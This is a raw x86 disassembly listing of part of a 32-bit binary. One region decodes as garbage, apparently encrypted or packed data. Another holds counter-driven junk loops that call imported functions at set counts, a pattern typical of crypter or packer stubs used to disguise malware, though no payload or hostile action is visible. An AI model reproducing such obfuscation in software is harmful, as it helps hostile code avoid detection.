  40bb85:	xchg   ecx,eax
  40bb86:	(bad)
  40bb8a:	fsub   DWORD PTR ds:0x62b65264
  40bb90:	in     al,0xb9
  40bb92:	ins    DWORD PTR es:[edi],dx
  40bb93:	scas   eax,DWORD PTR es:[edi]
  40bb94:	or     edi,DWORD PTR [edx+0x4]
  40bb97:	pop    esp
  40bb98:	add    DWORD PTR [esp+ecx*1+0xeca5af5],edi
  40bb9f:	ret    0xeecd
  40bba2:	into   
  40bba3:	test   eax,0x4c27e1ff
  40bba8:	mov    eax,0x111d8eb5
  40bbad:	ret    0xee97
  40bbb0:	dec    edx
  40bbb1:	sahf   
  40bbb2:	pusha  
  40bbb3:	mov    dl,0xc1
  40bbb5:	call   0x84f377bf
  40bbba:	push   ebx
  40bbbb:	addr16 pushw cs
  40bbbe:	rcr    DWORD PTR [edx],cl
  40bbc0:	sub    ecx,edi
  40bbc2:	lock mov al,ds:0xd33569b5
  40bbc8:	cwde   
  40bbc9:	jno    0x40bbd7
  40bbcb:	out    dx,eax
  40bbcc:	mov    cs,WORD PTR [edi+edi*1-0x20e92db]
  40bbd3:	mov    edi,DWORD PTR [eax+0xc09c06c]
  40bbd9:	mov    dl,dl
  40bbdb:	dec    edi
  40bbdc:	mov    al,BYTE PTR [esi]
  40bbde:	or     ecx,ebx
  40bbe0:	push   esi
  40bbe1:	sbb    BYTE PTR [edi+0xf01646f],0xea
  40bbe8:	icebp  
  40bbe9:	hlt    
  40bbea:	pusha  
  40bbeb:	sub    eax,0xe2a5f1e0
  40bbf0:	cmp    ecx,eax
  40bbf2:	dec    ecx
  40bbf3:	hlt    
  40bbf4:	lods   eax,DWORD PTR ds:[esi]
  40bbf5:	mov    al,ds:0x572b9628
  40bbfa:	test   al,0xb8
  40bbfc:	loope  0x40bb9f
  40bbfe:	push   esp
  40bbff:	mov    dh,al
  40bc01:	jge    0x40bc03
  40bc03:	push   ss
  40bc04:	sub    al,0xc9
  40bc06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc07:	js     0x40bc19
  40bc09:	or     DWORD PTR [ecx],edx
  40bc0b:	lea    ecx,[eax+0x7e]
  40bc0e:	push   esi
  40bc0f:	mov    edx,cs
  40bc11:	into   
  40bc12:	adc    DWORD PTR [ebx+ebp*1-0x33c05af5],ebx
  40bc19:	addr16 call 0xb286:0x7139005b
  40bc21:	rcl    DWORD PTR [esi+0x6c00b196],cl
  40bc27:	ins    BYTE PTR es:[edi],dx
  40bc28:	jne    0x40bbed
  40bc2a:	leave  
  40bc2b:	daa    
  40bc2c:	mov    edi,cs
  40bc2e:	cmp    DWORD PTR ds:0x4bd8239e,esi
  40bc34:	inc    esp
  40bc35:	leave  
  40bc36:	and    ch,dl
  40bc38:	xor    eax,0x422de875
  40bc3d:	dec    ebx
  40bc3e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc40:	xor    edx,DWORD PTR [ebx-0x43]
  40bc43:	xchg   ebx,eax
  40bc44:	push   ecx
  40bc45:	nop
  40bc46:	dec    ebx
  40bc47:	sti    
  40bc48:	pop    edx
  40bc49:	push   0xfffffff0
  40bc4b:	add    eax,0x5f88d1ad
  40bc50:	adc    al,0xaf
  40bc52:	imul   edx,DWORD PTR [eax+0x4c92cc8d],0xefe8ad15
  40bc5c:	sub    dh,bh
  40bc5e:	or     dh,BYTE PTR [ebp+0x22bfccc2]
  40bc64:	fldenv [edi+0x10]
  40bc67:	cmc    
  40bc68:	idiv   DWORD PTR [esp+edx*2+0x57]
  40bc6c:	les    edi,FWORD PTR ds:0x160b53a9
  40bc72:	outs   dx,DWORD PTR ds:[esi]
  40bc73:	shl    BYTE PTR [ebx+edx*4+0x2786e039],1
  40bc7a:	aam    0xe5
  40bc7c:	imul   esp,edi,0x5e2dfff7
  40bc82:	sub    esi,DWORD PTR [esi]
  40bc84:	xor    BYTE PTR [edx+0x766e3091],dl
  40bc8a:	inc    eax
  40bc8b:	inc    ebp
  40bc8c:	imul   ebp,edi,0xffffffef
  40bc8f:	inc    ebx
  40bc90:	sub    al,0xad
  40bc92:	add    bl,BYTE PTR [eax]
  40bc94:	nop
  40bc95:	popa   
  40bc96:	or     ebx,esp
  40bc98:	aaa    
  40bc99:	mov    al,ds:0x7f7669f9
  40bc9e:	test   DWORD PTR [edi+0x47675711],edx
  40bca4:	lock mov BYTE PTR ds:[eax+0x4b91f8a7],0xb6
  40bcad:	ja     0x40bcab
  40bcaf:	lahf   
  40bcb0:	cmp    ebp,DWORD PTR [edx]
  40bcb2:	inc    ebp
  40bcb3:	push   eax
  40bcb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcb5:	sbb    cl,BYTE PTR ds:0x3d183b94
  40bcbb:	add    al,0x80
  40bcbd:	mov    al,ds:0x6285dad2
  40bcc2:	pop    ss
  40bcc3:	in     eax,dx
  40bcc4:	mov    eax,0x3dde7c74
  40bcc9:	imul   edi,ebx,0xffffffc3
  40bccc:	nop
  40bccd:	cmp    al,0xa
  40bccf:	sbb    al,0x52
  40bcd1:	sbb    al,0xf1
  40bcd3:	daa    
  40bcd4:	bound  esi,QWORD PTR ds:0xe1dc9cbe
  40bcda:	jne    0x40bd48
  40bcdc:	fimul  DWORD PTR ds:0xa7958930
  40bce2:	dec    BYTE PTR [edx+0x7a373ac1]
  40bce8:	push   eax
  40bce9:	jecxz  0x40bd3c
  40bceb:	xchg   BYTE PTR [eax],cl
  40bced:	inc    esp
  40bcee:	test   BYTE PTR [ebx],bh
  40bcf0:	sub    BYTE PTR [edx-0x3036ecbe],bl
  40bcf6:	fiadd  DWORD PTR [ebp+0x31]
  40bcf9:	(bad)  
  40bcfa:	fnstcw WORD PTR [ebx]
  40bcfc:	push   es
  40bcfd:	(bad)  
  40bcfe:	stos   BYTE PTR es:[edi],al
  40bcff:	push   es
  40bd00:	pop    esp
  40bd01:	mov    ebx,0x1638016c
  40bd06:	dec    esi
  40bd07:	mov    bh,0x0
  40bd09:	cmp    DWORD PTR [ebx],esp
  40bd0b:	sub    dl,BYTE PTR [ebp-0x34]
  40bd0e:	mov    dh,0x97
  40bd10:	imul   ecx,DWORD PTR [esi-0x739e8fcf],0xffffffec
  40bd17:	xor    al,0xee
  40bd19:	sbb    esp,ecx
  40bd1b:	in     eax,0x64
  40bd1d:	inc    ecx
  40bd1e:	pop    ds
  40bd1f:	and    eax,0xab427d32
  40bd24:	jmp    0x40bd61
  40bd26:	inc    ecx
  40bd27:	push   es
  40bd28:	or     BYTE PTR [ebx-0x4e52ab35],dh
  40bd2e:	cmp    BYTE PTR [edx+0x4f],ah
  40bd31:	sub    ecx,DWORD PTR [eax+edi*8+0x15]
  40bd35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd36:	mov    edi,0xea708c02
  40bd3b:	sbb    eax,0x18bf0a7c
  40bd40:	add    al,0x5a
  40bd42:	push   esi
  40bd43:	cmc    
  40bd44:	push   ds
  40bd45:	cmc    
  40bd46:	adc    eax,0x8c76d508
  40bd4b:	xchg   edx,eax
  40bd4c:	pop    ss
  40bd4d:	or     ebx,ebp
  40bd4f:	mov    ecx,DWORD PTR [ecx]
  40bd51:	mov    DWORD PTR [eax],ecx
  40bd53:	jmp    0x40c074
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	xchg   esp,eax
  40bd65:	or     DWORD PTR ds:0x7e821caa,0x7e7d7a7e
  40bd6f:	jle    0x40bdb2
  40bd71:	mov    gs,esp
  40bd73:	lea    ecx,[edx]
  40bd75:	push   esi
  40bd76:	or     al,0xe
  40bd78:	leave  
  40bd79:	mov    DWORD PTR [ebp+ecx*8-0x14c5b110],eax
  40bd80:	mov    ecx,ebp
  40bd82:	add    al,0x59
  40bd84:	clc    
  40bd85:	arpl   WORD PTR [ecx],di
  40bd87:	mov    ebp,0x44338fa8
  40bd8c:	loopne 0x40bd91
  40bd8e:	jecxz  0x40bd4f
  40bd90:	bnd ret 
  40bd92:	call   0xa727:0x9a287073
  40bd99:	nop
  40bd9a:	pop    ds
  40bd9b:	test   eax,0x2f3eeb29
  40bda0:	or     edi,ebp
  40bda2:	jne    0x40bd4e
  40bda4:	mov    eax,0x50ec6542
  40bda9:	add    DWORD PTR [ebp-0x45],esi
  40bdac:	jge    0x40bd6f
  40bdae:	arpl   WORD PTR ds:0x86018138,ax
  40bdb4:	ss dec edx
  40bdb6:	mov    ds:0x4ab3f488,eax
  40bdbb:	imul   esp,DWORD PTR [edi],0xe417711d
  40bdc1:	mov    edi,DWORD PTR [ecx+0x68905850]
  40bdc7:	sti    
  40bdc8:	mov    ch,0xbf
  40bdca:	test   al,0x17
  40bdcc:	push   esi
  40bdcd:	std    
  40bdce:	test   DWORD PTR ds:0x5344e4de,ecx
  40bdd4:	int3   
  40bdd5:	mov    DWORD PTR ds:0xbb202c92,ecx
  40bddb:	mov    al,0xc
  40bddd:	add    esp,edi
  40bddf:	mov    eax,ds:0x154b09ca
  40bde4:	sar    DWORD PTR [edx-0x2348fcea],1
  40bdea:	inc    edx
  40bdeb:	ins    DWORD PTR es:[edi],dx
  40bdec:	cmp    al,0x9a
  40bdee:	(bad)
  40bdf1:	xchg   edx,eax
  40bdf2:	cdq    
  40bdf3:	pop    eax
  40bdf4:	aaa    
  40bdf5:	popf   
  40bdf6:	mov    ?,eax
  40bdf8:	mov    ?,ebx
  40bdfa:	aaa    
  40bdfb:	sub    DWORD PTR cs:[eax-0x52],esp
  40bdff:	std    
  40be00:	ja     0x40be2d
  40be02:	mov    eax,ds:0x83d15816
  40be07:	add    BYTE PTR [ecx],0x49
  40be0a:	xor    dh,BYTE PTR [edi-0x49e350ca]
  40be10:	mov    edx,0xe9cc1c6d
  40be15:	loopne 0x40be7f
  40be17:	jne    0x40be0f
  40be19:	mov    esp,0x6c869325
  40be1e:	xor    eax,0x6b1b5662
  40be23:	jns    0x40be22
  40be25:	ror    DWORD PTR [bx+di+0x2fbe],1
  40be2a:	jge    0x40bde7
  40be2c:	or     eax,0x92eefc22
  40be31:	stos   DWORD PTR es:[edi],eax
  40be32:	or     ah,BYTE PTR [edx-0x503ef4a5]
  40be38:	(bad)  [edx+eax*4+0x21]
  40be3c:	add    al,0x4f
  40be3e:	daa    
  40be3f:	mov    BYTE PTR [eax+ecx*8+0x7f7b81dc],0xa
  40be47:	or     eax,0x1e10e785
  40be4c:	sub    DWORD PTR [ecx+0x4d],eax
  40be4f:	in     al,dx
  40be50:	arpl   bx,si
  40be52:	dec    esp
  40be53:	or     eax,0x64cb5e2c
  40be58:	jge    0x40be80
  40be5a:	mov    ecx,DWORD PTR [eax-0x4e9963b4]
  40be60:	loopne 0x40be43
  40be62:	fsubr  DWORD PTR [esi+0x2]
  40be65:	fninit 
  40be67:	js     0x40bebf
  40be69:	aam    0xec
  40be6b:	inc    ecx
  40be6c:	fisttp QWORD PTR ds:0x185085cb
  40be72:	fwait
  40be73:	in     eax,dx
  40be74:	pop    edi
  40be75:	add    dl,BYTE PTR [edx-0x3bc7a9e2]
  40be7b:	test   eax,0xeff07f2f
  40be80:	imul   edx,DWORD PTR [ebx+ebp*8-0x6a28aa2d],0xefe4aa19
  40be8b:	rol    DWORD PTR [ebp-0xc],1
  40be8e:	push   es
  40be8f:	fwait
  40be90:	xor    al,0x4c
  40be92:	stos   DWORD PTR es:[edi],eax
  40be93:	std    
  40be94:	in     al,dx
  40be95:	repz mov cs,WORD PTR [esi]
  40be98:	xlat   BYTE PTR ds:[ebx]
  40be99:	(bad)  
  40be9b:	dec    eax
  40be9c:	and    esp,0x2f8f92c
  40bea2:	sub    esi,ebx
  40bea4:	ret    
  40bea5:	sbb    eax,0xfee1479b
  40beaa:	push   ebx
  40beab:	xchg   edx,eax
  40beac:	in     al,dx
  40bead:	mov    dl,0x69
  40beaf:	xchg   ebp,eax
  40beb0:	mov    ch,0x7e
  40beb2:	mov    al,cl
  40beb4:	sub    BYTE PTR [eax+eax*8-0x758eb9c4],bh
  40bebb:	mov    ds:0x767b8282,al
  40bec0:	mov    bh,0xb0
  40bec2:	xchg   edx,eax
  40bec3:	sbb    BYTE PTR [edx+0x1e16c6de],0xf8
  40beca:	or     BYTE PTR [edx],0xfd
  40becd:	mov    dl,BYTE PTR [edx]
  40becf:	push   esi
  40bed0:	cmc    
  40bed1:	push   0xb94bd7ab
  40bed6:	adc    DWORD PTR [esi],eax
  40bed8:	icebp  
  40bed9:	mov    dl,0xd
  40bedb:	imul   ebp,DWORD PTR [ecx+0x2f47860a],0xffffffd3
  40bee2:	and    BYTE PTR [edi],ah
  40bee4:	add    al,0xf9
  40bee6:	fisub  DWORD PTR ss:[edi+0x7672e895]
  40beed:	jge    0x40be8b
  40beef:	dec    esi
  40bef0:	jp     0x40bed1
  40bef2:	sub    eax,DWORD PTR [ebx+0x29]
  40bef5:	add    eax,0x1ce581cb
  40befa:	call   0x41df:0x21bc2a67
  40bf01:	jnp    0x40bedf
  40bf03:	pop    esp
  40bf04:	or     eax,0x25e99595
  40bf09:	add    al,BYTE PTR [esi-0x7822ff8c]
  40bf0f:	inc    edi
  40bf10:	xor    ebx,DWORD PTR gs:[ecx]
  40bf13:	and    DWORD PTR [eax],ebp
  40bf15:	xchg   BYTE PTR [edx+0x26],dl
  40bf18:	sti    
  40bf19:	fadd   st,st(1)
  40bf1b:	inc    edi
  40bf1c:	push   es
  40bf1d:	lea    edi,[ecx]
  40bf1f:	xchg   ebp,esp
  40bf21:	dec    esp
  40bf22:	mov    edi,0xa856d51a
  40bf27:	int3   
  40bf28:	jns    0x40bebb
  40bf2a:	bound  esi,QWORD PTR [edi-0x12]
  40bf2d:	xor    dh,BYTE PTR [esi+0x42a3d39b]
  40bf33:	jg     0x40bf89
  40bf35:	sbb    DWORD PTR [ebx+0x8],edx
  40bf38:	push   ebp
  40bf39:	outs   dx,BYTE PTR ds:[esi]
  40bf3a:	adc    BYTE PTR [ebx],al
  40bf3c:	mov    dh,0x7a
  40bf3e:	adc    dl,BYTE PTR [ebp+0x3]
  40bf41:	jns    0x40bf78
  40bf43:	(bad)  
  40bf44:	ins    DWORD PTR es:[edi],dx
  40bf45:	xor    eax,0x508f5448
  40bf4a:	push   ss
  40bf4b:	push   ebx
  40bf4c:	fs inc edi
  40bf4e:	mov    DWORD PTR [ebp-0x2075ebd],0x4290abf3
  40bf58:	push   0xc4d3b613
  40bf5d:	jb     0x40bf8a
  40bf5f:	adc    ah,cl
  40bf61:	xchg   ebp,eax
  40bf62:	pusha  
  40bf63:	or     esp,ebp
  40bf65:	push   eax
  40bf66:	cmp    al,0x90
  40bf68:	or     eax,0xaeb3da77
  40bf6d:	push   ds
  40bf6e:	jg     0x40bfbc
  40bf70:	push   ebp
  40bf71:	hlt    
  40bf72:	pop    ecx
  40bf73:	add    eax,0x1460b297
  40bf78:	dec    esi
  40bf79:	iret   
  40bf7a:	fst    DWORD PTR [edi+ebx*2+0x151e8315]
  40bf81:	add    al,0xb9
  40bf83:	pop    di
  40bf85:	mov    ds:0x5bdf473f,al
  40bf8a:	sub    eax,0x44ea2090
  40bf8f:	scas   eax,DWORD PTR es:[edi]
  40bf90:	xor    ch,dl
  40bf92:	ret    0xc25a
  40bf95:	test   al,0x91
  40bf97:	push   esi
  40bf98:	sti    
  40bf99:	iret   
  40bf9a:	pop    ebp
  40bf9b:	fbstp  TBYTE PTR [esi-0x5e]
  40bf9e:	inc    esp
  40bf9f:	mov    BYTE PTR [esi-0x75],dl
  40bfa2:	popa   
  40bfa3:	(bad)  
  40bfa4:	push   0x1d
  40bfa6:	call   0xc04ef139
  40bfab:	xchg   BYTE PTR [ebx+0x44],dh
  40bfae:	mov    al,ds:0x2a25c380
  40bfb3:	push   esp
  40bfb4:	std    
  40bfb5:	mov    BYTE PTR [edi],bh
  40bfb7:	cmp    BYTE PTR [ecx],dh
  40bfb9:	xor    al,0x8a
  40bfbb:	mov    WORD PTR [ebx],ds
  40bfbd:	into   
  40bfbe:	(bad)  
  40bfbf:	cdq    
  40bfc0:	fidiv  DWORD PTR [ebx+0x7d]
  40bfc3:	jne    0x40bf79
  40bfc5:	or     esp,ebp
  40bfc7:	adc    BYTE PTR [edx+edx*2+0x220f106b],ch
  40bfce:	cmp    al,0x4
  40bfd0:	fisttp QWORD PTR [ebx-0x240bbc3]
  40bfd6:	jg     0x40c029
  40bfd8:	dec    ebx
  40bfd9:	add    DWORD PTR [eax+0x26e2df74],esp
  40bfdf:	pop    ds
  40bfe0:	adc    al,0x2e
  40bfe2:	stc    
  40bfe3:	in     eax,dx
  40bfe4:	and    al,0xa1
  40bfe6:	ret    
  40bfe7:	xchg   edi,eax
  40bfe8:	push   ebp
  40bfe9:	pop    ecx
  40bfea:	cdq    
  40bfeb:	pop    es
  40bfec:	ds cmp bx,WORD PTR ss:[ebp-0x11]
  40bff2:	inc    ecx
  40bff3:	mov    dl,0xaa
  40bff5:	fild   WORD PTR [eax+eax*8]
  40bff8:	aas    
  40bff9:	enter  0xa786,0x53
  40bffd:	(bad)  
  40bffe:	and    eax,0xd529ee7a
  40c003:	in     al,0x59
  40c005:	fimul  WORD PTR [edx]
  40c007:	dec    edi
  40c008:	pop    ecx
  40c009:	addr16 mov bl,0x38
  40c00c:	test   DWORD PTR [edx+ebx*8+0x62a2701],esi
  40c013:	lea    edi,[esi+0x2d]
  40c016:	cli    
  40c017:	js     0x40bff0
  40c019:	loopne 0x40c05a
  40c01b:	pushf  
  40c01c:	arpl   WORD PTR [esi+0x4881fb1],bx
  40c022:	addr16 imul edi,ebp,0x3
  40c026:	es fsubr st(5),st
  40c029:	shl    DWORD PTR [esi],0x2e
  40c02c:	imul   edx,DWORD PTR [esi],0x64664c8d
  40c032:	inc    ecx
  40c033:	xchg   ecx,eax
  40c034:	int3   
  40c035:	sub    DWORD PTR [ebx],esp
  40c037:	outs   dx,DWORD PTR ds:[esi]
  40c038:	int3   
  40c039:	daa    
  40c03a:	cli    
  40c03b:	test   DWORD PTR [edi+0x3f430637],0xfed5222
  40c045:	dec    edx
  40c046:	fs aaa 
  40c048:	jmp    0x40bffd
  40c04a:	leave  
  40c04b:	retf   
  40c04c:	lahf   
  40c04d:	aaa    
  40c04e:	out    0xe,al
  40c050:	pop    ebp
  40c051:	rcr    ebp,0x6c
  40c054:	out    dx,al
  40c055:	cli    
  40c056:	cmp    esi,eax
  40c058:	cmp    DWORD PTR [ebx-0x56],edi
  40c05b:	pop    esp
  40c05c:	and    eax,0x2b7dc0dc
  40c061:	lods   al,BYTE PTR ds:[esi]
  40c062:	sbb    eax,DWORD PTR [edi+0x3fd30eff]
  40c068:	xlat   BYTE PTR ds:[ebx]
  40c069:	idiv   DWORD PTR [ecx-0x1331971a]
  40c06f:	fiadd  DWORD PTR [edx+0x34]
  40c072:	arpl   dx,ax
  40c074:	mov    eax,DWORD PTR [ebp+0xc]
  40c077:	mov    eax,DWORD PTR [ebp+0x8]
  40c07a:	push   DWORD PTR [ebp-0x8]
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433717,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433727
  40c0b4:	and    DWORD PTR ds:0x433783,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4337b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4337b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4337b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4337b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4337b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4337e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4337e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4337e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4337e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4337e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4337e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4337e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4337e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433783,0x1d
  40c169:	cmp    DWORD PTR ds:0x433783,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433783,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433880
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433783,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433783
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433783,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433783
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433783,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4337ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4337b7
  40c1dd:	xor    DWORD PTR ds:0x433713,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43371b,0x43377b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43372b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4337a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4337a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4337a7,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4337a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4337a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4337eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4337eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4337eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4337eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4337eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4337eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4337eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4337eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433733,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433733
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433733,esi
  40c2c4:	cmp    DWORD PTR ds:0x433733,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433733,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4337f3,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4337eb
  40c301:	adc    DWORD PTR ds:0x4337fb,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x43374b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433787
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4337e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43372f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4337a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433733,0x433767
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4337ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4337ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4337ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4337ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4337ff,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x4337ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4337ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4337ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43376b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4337ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4337ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43382b,0x43383b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4337af,0x4337bf
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x4337c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433737,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43372b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x43372f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433723,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4337e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4337f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4337a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4337eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4337eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4337eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4337eb,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4337eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4337eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4337eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4337eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4337eb
  40c4ce:	and    esi,DWORD PTR ds:0x4337ef
